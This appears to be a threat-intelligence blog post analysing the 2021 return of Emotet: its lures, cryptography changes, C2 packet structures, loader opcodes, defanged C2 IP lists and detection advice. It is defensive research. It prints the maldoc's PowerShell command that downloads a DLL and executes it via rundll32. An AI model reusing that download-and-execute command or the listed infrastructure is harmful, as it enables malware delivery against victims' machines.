@@ -1,0 +1,214 @@
+How the new Emotet differs from previous versions
+Dec 09, 2021
+Last month, Intel 471 observed the emergence of Emotet, a notorious strain of malware that had been dormant for most of 2021 after law enforcement agencies [forced it offline](https://intel471.com/blog/emotet-takedown-2021).
+We wrote in January that “Only time will tell if the takedown will have a long-term impact on Emotet operations.
+The groups who run these botnets are sophisticated and resilient, and will most likely have some sort of inherent recovery in place.
+While it took months to do, it looks like those behind Emotet have recovered.
+Our initial analysis found some similarities between the new version and what was previously used.
+However, given further examination, we have found distinct differences, including the encryption used for communication, additional commands and reconfigurations in several pieces of the communication protocol.
+Further investigation into Emotet’s keys and IP buffers also revealed two separate botnets are being used to distribute the malware.
+By searching for these differences, security teams can fine-tune their defenses to make sure this new version can be detected.
+**What we already knew**
+Emotet is a loader-focused, modular malware family that can steal credentials and emails, while also allowing users to send spam from infected users.
+The modules we observed included:
+* A SPAM module
+* Email credential stealer
+* Outlook email address harvester
+* Browser credential stealer
+* Web-injector
+* A module that allowed for brute-forcing credentials and lateral movement
+In the short time that the malware has been active, Emotet has been heavily used to push malspam.
+While Intel 471 Malware Intelligence systems were unable to collect any malspam from Emotet, open source intelligence (OSINT) spam samples pulled from various sources, including the VirusTotal intelligence platform, demonstrate the spam templates used.
+Emotet emails are fairly simple, consisting of an attached compressed (.zip) file and password used to open the file.
+![Image 1 email lure]()
+The image depicts an Emotet email lure.
+While the found lure was in the Spanish language, senders and receivers were spread worldwide, leading to nearly global targeting.
+The encrypted .zip file contained a malicious Microsoft Word document (maldoc) used to download and install the Emotet loader.
+Upon opening Emotet maldocs, victims are greeted with fake Microsoft 365 prompt that states “THIS DOCUMENT IS PROTECTED,” and instructs victims on how to enable macros.
+![Image 2 the lure]()
+The image depicts an Emotet document lure.
+Enabling macros will allow the document to spawn PowerShell and attempt to download and execute the Emotet loader.
+The document uses at least five different distribution lures typically to ensure reliability and uptime for loader distribution.
+The document uses the following commands to spawn PowerShell and attempt to download and execute the malware:
+* ```
+"C:\Windows\System32\cmd[.]exe" /c start /B powershell $dfkj="$strs=\"".Split(\",\");foreach($st in $strs){$r1=Get-Random;$r2=Get-Random;$tpth=\"c:\programdata\\\"+$r1+\"[.]dll\";Invoke-WebRequest -Uri $st -OutFile $tpth;if(Test-Path $tpth){$fp=\"c:\windows\syswow64\rundll32[.]exe\";$a=$tpth+\",f\"+$r2;Start-Process $fp -ArgumentList $a;break;}};";IEX $dfkj
+```
+* ```
+powershell $dfkj="$strs=\"".Split(\",\");foreach($st in $strs){$r1=Get-Random;$r2=Get-Random;$tpth=\"c:\programdata\\\"+$r1+\"[.]dll\";Invoke-WebRequest -Uri $st -OutFile $tpth;if(Test-Path $tpth){$fp=\"c:\windows\syswow64\rundll32[.]exe\";$a=$tpth+\",f\"+$r2;Start-Process $fp -ArgumentList $a;break;}};";IEX $dfkj
+```
+* ```
+"C:\windows\syswow64\rundll32[.]exe" c:\programdata\219183368[.]dll,f920683129
+```
+Defenders should look for Microsoft Word or Excel sheets that spawn `CMD -> PowerShell -> rundll32[.]exe` to identify Emotet activity.
+**What we learned**
+Many parts of the bot are identical to the version of Emotet that was active prior to the takedown, particularly the dynamic-link library (DLL).
+Emotet depends on `rundll32[.]exe` to execute, using the exported function “Control\\_RunDLL” as the main starting function.
+While the loader uses a fairly intensive code flattening/state machine obfuscator, YARA rules created from a few key Emotet algorithms indicate the loader is based on code dated from December 2020 to January 2021.
+Despite previous versions of code being recycled, there are differences in the loader that set it apart from Emotet’s past.
+The old Emotet used an onboard public Rivest-Shamir-Adleman (RSA) key to encrypt the advanced encryption standard (AES) key used to encrypt all network traffic, as is typical for asymmetric encryption.
+This public key also is used during communication validation by hashing the data to check that it has not been modified.
+The new Emotet uses Elliptic Curve Cryptography (ECC) for asymmetric encryption, leveraging an onboard elliptic-curve Diffie-Hellman (ECDH) public key for encryption and an onboard elliptic-curve Digital Signature Algorithm (ECDSA) public key for data validation.
+These encryption keys are used to identify the Emotet botnets researchers are calling Epoch4 and Epoch5.
+**Protocol changes**
+In addition to the changes to Emotet’s cryptography, the communication protocol also saw some changes to each of the three “layers” necessary for communication.
+Layer 1 (L1) contains the plaintext data sent to the command and control (C2).
+Layer 2 (L2) contains the client command operation code (opcode) sent by the victim and a SHA-256 hash of L1.
+Layer 3 (L3) is the encrypted data and contains the encrypted AES key, the encrypted data and some randomly generated data as padding.
+**Protocol changes: L1**
+The old Emotet also used a multilayer communication protocol for all communication performed by the infected victim and the C2.
+However, the old protocol required the loader to also enumerate the victim’s process list, which was sent to the C2 during check-in.
+New Emotet strips out this process checking functionality from initial check-in and places it into a new module focused on process list checking.
+The following structure was observed for the new Emotet initial check-in:
+```
+struct layer\\_1\\_packet
+{
+uint32\\_t victim\\_id\\_size;
+uint8\\_t victim\\_id[victim\\_id\\_size]; // hostname + hex volume serial number
+uint32\\_t path\\_name\\_hash;
+uint32\\_t protocol\\_version; // 0x13465AA or 20211114 in decimal
+uint32\\_t loader\\_version; // 0x2710
+uint32\\_t system\\_info;
+uint32\\_t session\\_id;
+uint32\\_t module\\_id\\_array\\_size;
+uint8\\_t module\\_id\\_array[module\\_id\\_array\\_size]; //if module\\_id\\_array\\_size is 0, this field is not included
+}
+```
+This structure can also be observed in the image below:
+![Image 3 proto format]()
+The image depicts the structure for Emotet's initial check-in.
+A new addition to the Emotet protocol requirements and Emotet module list, the process checking module is sent to the bot after the C2 receives the bot’s initial check-in.
+This module exclusively grabs the infected victim’s process list, which is sent back to the C2 using the following L1:
+```
+struct layer\\_1\\_packet
+{
+uint32\\_t module\\_id; //0x2 or 2 in decimal
+uint32\\_t module\\_job\\_id;
+uint32\\_t victim\\_id\\_size;
+uint8\\_t victim\\_id[victim\\_id\\_size]; // hostname + hex volume serial number
+uint32\\_t process\\_name\\_buffer\\_size;
+uint8\\_t process\\_name\\_buffer[process\\_name\\_buffer\\_size]; //separated by commas
+}
+```
+Emotet no longer delivers any modules until the process list module has been received successfully and the C2 has received the process list from the bot.
+Additionally, the module\\_id and module\\_job\\_id no longer are stored inside the module itself, but instead are stored in the command buffer received from the C2.
+**Protocol Changes: L2**
+L2 for Emotet’s communication protocol adds the client command opcode and a SHA-256 hash of the L1 data.
+This information is prepended to L1.
+The following structure can be observed for L2:
+```
+struct layer\\_2\\_packet
+{
+uint32\\_t cmd\\_id;
+uint32\\_t hash\\_size; // 0x20
+uint8\\_t data\\_hash[0x20]; // SHA-256 hash of Plaintext packet
+uint32\\_t data\\_size; // Plaintext packet size
+uint8\\_t data[data\\_size]; // Plaintext packet
+}
+```
+The following table shows the cmd\\_ids that have been observed:
+| **Command ID (decimal)** | **Command ID (hex)** | **Description** |
+| 1 | 0x01 | Initial victim check-in packet |
+| 1000 | 0x3E8 | Proclist check-in packet |
+**Protocol Changes: L3**
+L3 for Emotet’s communication protocol contains the encrypted L2, the ECC key used to encrypt L2 and some randomly generated data that serves as padding.
+The following structure can be observed for L3:
+```
+struct L3\\_packet
+{
+uint8\\_t enc\\_secret\\_key[0x40]; // ECDH key
+uint8\\_t encrypted\\_data[];
+uint8\\_t random\\_data[]; // Random data generated using BCryptGenRandom function
+}
+```
+The randomly generated data has some interesting formatting performed on it that first replaces all nulls with `0xC3`.
+It then selects a random integer between zero and 14 and writes `0x00`to the offset of that integer.
+**Loader command table changes**
+In addition to protocol changes, Intel 471 analysts also observed changes to the new Emotet command table.
+This table handles module/binary execution and has the following opcodes:
+| **Opcode** | **Command name** | **Description** |
+| 1 | Update binary | Drops and starts binary after extracting modlist/drop directory and appending to command line as base64.
+|
+| 2 | Load Module | Injects a module into memory.
+|
+| 3 | Execute EXE | Drops and executes executable.
+|
+| 4 | Execute EXE as user | Drops and executes executable as a specific user.
+|
+| 5 | Inject DLL with export | Injects a DLL into memory and maps and executes the export DllRegisterServer.
+|
+| 6 | Execute dll with `regsvr32[.]exe` | Drops and executes DLL with `“regsvr32[.]exe -s .”`
+|
+| 7 | Execute dll with `rundll32[.]exe` | Drops and executes DLL with `“rundll32[.]exe , Control\_RunDLL.”`
+|
+The update to the loader’s command table gives Emotet much more customizable execution options, allowing Emotet to better function as a loader-focused distribution family.
+In the course of investigating the code, Intel 471 found two new distinct Emotet botnets.
+We are categorizing them as:
+* Epoch4
+* Epoch5
+Additionally, prior to Emotet’s takedown, it had the following distinct botnets:
+* Epoch1
+* Epoch2
+* Epoch3
+The following IPs are currently observed in use for Epoch 4:
+* hxxps://103.8.26.103:8080
+* hxxps://212.237.17.99:8080
+* hxxps://216.158.226.206:443
+* hxxps://41.76.108.46:8080
+* hxxps://50.116.54.215:443
+* hxxps://210.57.217.132:8080
+* hxxps://103.8.26.102:8080
+* hxxps://138.185.72.26:8080
+* hxxps://178.79.147.66:8080
+* hxxps://91.200.186.228:443
+* hxxps://58.227.42.236:80
+* hxxps://107.182.225.142:8080
+* hxxps://212.237.5.209:443
+* hxxps://195.154.133.20:443
+* hxxps://110.232.117.186:8080
+* hxxps://191.252.196.221:8080
+* hxxps://185.184.25.237:8080
+* hxxps://81.0.236.90:443
+* hxxps://188.165.214.166:7080
+* hxxps://212.237.56.116:7080
+* hxxps://45.142.114.231:8080
+* hxxps://104.251.214.46:8080
+* hxxps://176.104.106.96:8080
+* hxxps://158.69.222.101:443
+* hxxps://51.68.175.8:8080
+* hxxps://45.118.135.203:7080
+* hxxps://207.38.84.195:8080
+* hxxps://103.75.201.2:443
+The following IPs are currently observed in use for Epoch 5:
+* hxxps://85.214.67.203:8080
+* hxxps://51.178.61.60:443
+* hxxps://66.42.57.149:443
+* hxxps://45.79.33.48:8080
+* hxxps://54.38.242.185:443
+* hxxps://191.252.103.16:80
+* hxxps://196.44.98.190:8080
+* hxxps://185.148.169.10:8080
+* hxxps://142.4.219.173:8080
+* hxxps://207.148.81.119:8080
+* hxxps://177.72.80.14:7080
+* hxxps://51.210.242.234:8080
+* hxxps://37.59.209.141:8080
+* hxxps://168.197.250.14:80
+* hxxps://54.37.228.122:443
+* hxxps://195.77.239.39:8080
+* hxxps://78.46.73.125:443
+* hxxps://37.44.244.177:8080
+* hxxps://195.154.146.35:443
+* hxxps://78.47.204.80:443
+**What we suggest for remediation**
+As Emotet is a multistage infection, there are many opportunities for defenders to catch it during operation.
+During the email/maldoc stage, one such method for detection is user awareness regarding the lure template Emotet uses.
+The red box template in Image 2 is standard for Emotet documents.
+If that fails, defenders can look for instances where PowerShell is spawned from Microsoft Word or Excel sheets and subsequently opens `rundll32[.]exe` to execute a DLL.
+While Emotet typically uses the export “Control\\_RunDLL,” looking for instances that do not use that export still would be a good idea, since this behavior is unusual in non-malicious settings.
+As Emotet creates both a run key and a service during install, defenders can watch for any suspicious services created, especially if the process the service launched originates from `%LOCALAPPDATA%`.
+Additionally, during various command executions, defenders can look for the following command lines to detect Emotet when it executes binaries.
+However, Emotet will have installed at this point and a full investigation will be needed:
+* `Regsvr32[.]exe -s `
++ Look for the execution of DLLs dropped to `%temp%`.
+* `Rundll32[.]exe , Control\_RunDLL`
++ Look for the execution of DLLs dropped to `%temp%`.
